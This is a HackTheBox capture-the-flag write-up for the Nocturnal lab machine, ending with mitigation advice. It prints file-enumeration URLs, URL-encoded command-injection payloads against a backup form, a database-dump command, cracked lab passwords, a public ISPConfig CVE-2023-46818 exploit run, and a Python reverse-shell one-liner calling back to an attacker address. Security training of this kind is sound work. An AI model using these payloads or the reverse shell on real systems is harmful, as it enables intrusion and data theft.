---
title: "Nocturnal"
date: 2025-08-16 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [LFI, ODT, ZIP, Command-Injection, SQLite, MD5, SSH, ISPConfig, CVE-2023-46818, Port-Forwarding]
description: Writeup for HackTheBox Nocturnal machine
image:
  path: assets/img/nocturnal/nocturnal.png
  alt: HTB Nocturnal
---
## Executive Summary

Nocturnal is a medium-difficulty Linux machine that chains a local file disclosure via ODT document extraction, command injection in a backup utility, and a public ISPConfig RCE exploit to achieve root compromise.

**LFI & ODT Extraction:** A file viewer endpoint `view.php` is vulnerable to local file enumeration by username. Fuzzing reveals user `amanda` with a `private.odt` file. A hidden ZIP archive embedded in the ODT leaks plaintext credentials for `amanda`.

**Command Injection & SQLite Leak:** Logged in as amanda, the admin backup panel in `admin.php` passes the `password` parameter unsanitized into a shell command. Injecting commands dumps the SQLite database, revealing a password hash for `tobias` which cracks to `slowmotionapocalypse`.

**SSH & ISPConfig Discovery:** SSH as tobias recovers `user.txt`. Internal port scanning reveals ISPConfig on 127.0.0.1:8080. Port forwarding exposes the web panel.

**CVE-2023-46818 — ISPConfig RCE:** ISPConfig admin credentials are reused from `tobias`. A public Python exploit for CVE-2023-46818 injects a shell into the ISPConfig monitoring module, yielding a root session and `root.txt`.

## Reconnaissance

Starting with an Nmap scan to identify open ports:

```shell
nmap -sC -sV -oN nmap/initial nocturnal.htb
```

```
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (1.4s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Two open ports**: SSH (22) and HTTP (80) running Nginx. The host is Ubuntu. We add `nocturnal.htb` to `/etc/hosts`:

```shell
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

Browsing to `http://nocturnal.htb` shows a document management portal with registration and login pages. Directory fuzzing reveals the application structure:

```shell
feroxbuster -u http://nocturnal.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

```
200     http://nocturnal.htb/login.php
200     http://nocturnal.htb/register.php
200     http://nocturnal.htb/
403     http://nocturnal.htb/uploads
```

We register a new account (`hello:newpassword`), log in, and find a dashboard where users can upload ODT documents. The application also has a `view.php` endpoint that accepts `username` and `file` parameters to retrieve user files.

### LFI via Account Enumeration

The `view.php` endpoint is vulnerable — it resolves files by username. We can fuzz valid usernames by checking for different response sizes:

```shell
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
     -u 'http://nocturnal.htb/view.php?username=FUZZ&file=bad.odt' \
     -H "Cookie: PHPSESSID=<session>" -fc 403 -ac
```

Two valid users respond:

```
admin   [Status: 200, Size: 3037]
amanda  [Status: 200, Size: 3113]
```

Since the `file` parameter accepts filenames with wildcards, we can enumerate files for user `amanda`:

```
http://nocturnal.htb/view.php?username=amanda&file=*.odt
```

This reveals `private.odt`. Downloading it:

```
http://nocturnal.htb/view.php?username=amanda&file=private.odt
```

### Extracting Credentials from the ODT

ODT files are ZIP archives containing XML content. The downloaded `private.odt` has a second ZIP archive embedded at a specific offset. We extract it:

```shell
dd if=private.odt bs=1 skip=2919 > archive.zip
unzip -p archive.zip content.xml | head -50
```

The offset `2919` was found by examining the ODT's binary structure — after the first ODT's ZIP directory ends, a second embedded archive begins. The `content.xml` within contains plaintext credentials:

```
amanda:arHkG7HAI68X8s1J
```

Logging into the web application as `amanda` reveals an **admin panel** at `/admin.php` with a backup feature.

### Command Injection in Backup

The admin backup panel passes the `password` field unsanitized into a shell command (likely constructing `zip -P <password> backup.zip <files>`). By injecting shell metacharacters, we can execute arbitrary commands:

```
POST /admin.php
password=%0Abash%09-c%09"id"%0A&backup=
```

Decoded:
```
password=
bash -c "id"
&backup=
```

`%0A` (newline) breaks out of the intended zip command, and `%09` (tab) serves as whitespace. This confirms command execution.

### Extracting the SQLite Database

We use the injection to dump the SQLite database:

```
POST /admin.php
password=%0Abash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%0A&backup=
```

The `users` table contains MD5 password hashes:

| id | username | md5 hash                           |
|----|----------|------------------------------------|
| 1  | admin    | d725aeba143f575736b07e045d8ceebb   |
| 2  | amanda   | df8b20aa0c935023f99ea58358fb63c4   |
| 4  | tobias   | 55c82b1ccd55ab219b3b109b07d5061d   |

Cracking via [CrackStation](https://crackstation.net/):

| User   | Password              |
|--------|-----------------------|
| admin  | *(uncracked)*         |
| amanda | *(already known)*     |
| tobias | `slowmotionapocalypse` |

### SSH Access — User Flag

```shell
ssh tobias@nocturnal.htb
tobias@nocturnal.htb's password: slowmotionapocalypse

tobias@nocturnal:~$ cat user.txt
************37feec9fbac853...
```

## Privilege Escalation

### Internal Service Discovery

Running `netstat` reveals services bound to localhost:

```
127.0.0.1:8080   ISPConfig
127.0.0.1:3306   MySQL
127.0.0.1:25     Postfix/SMTP
127.0.0.1:587    SMTP submission
```

Port **8080** is running **ISPConfig**, a web hosting control panel. Since it's local-only, we forward it via SSH:

```shell
ssh -L 8888:127.0.0.1:8080 tobias@nocturnal.htb
```

Accessing `http://127.0.0.1:8888` shows the ISPConfig login panel.

### CVE-2023-46818 — ISPConfig RCE

ISPConfig has an **authenticated remote code execution** vulnerability (CVE-2023-46818) in its monitoring module. The exploit injects commands into the monitoring function's command parameter.

The admin credentials for ISPConfig are reused (`admin:slowmotionapocalypse`):

```shell
python3 exploit.py http://127.0.0.1:8888 admin slowmotionapocalypse
```

```
[+] Target URL: http://127.0.0.1:8888/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# cat /root/root.txt
************37feec9fbac853
```

For a full interactive root shell, start a listener and send a reverse shell:

```shell
# Terminal 1 — listener
nc -lvnp 4444

# In the ispconfig-shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

## Mitigations & Security Recommendations

1. **Access Controls on File Viewing Operations**:
   - Implement strict ownership checks on file access endpoints. Ensure the application verifies that the requesting user owns the requested file before serving it.
   - Avoid file retrieval mechanisms that resolve wildcards (e.g., `*.odt`) or permit direct path traversal.

2. **Prevent Command Injection in Backup Operations**:
   - Never pass unsanitized user inputs (such as the backup password field) directly into system shell calls or string-interpolated commands.
   - Utilize standard library functions for archiving/compression that do not invoke external shell processes, or strictly sanitize inputs against an allowlist of alphanumeric characters before execution.

3. **Strong Password Hashing and Secure Storage**:
   - Do not use weak and outdated cryptographic hash algorithms like MD5 to store user credentials in the database. Upgrade to modern password hashing algorithms such as Argon2id or bcrypt.
   - Enforce robust policies to prevent sensitive credentials or backup keys from being embedded directly in public-facing templates or user documents.

4. **Secure Internally Exposed Administrative Panels**:
   - Regularly patch administrative panels and applications (such as ISPConfig) to defend against known vulnerabilities like CVE-2023-46818.
   - Restrict access to administrative interfaces by keeping them bound to localhost (forcing SSH port forwarding) or behind a VPN/Firewall with IP-based access lists.
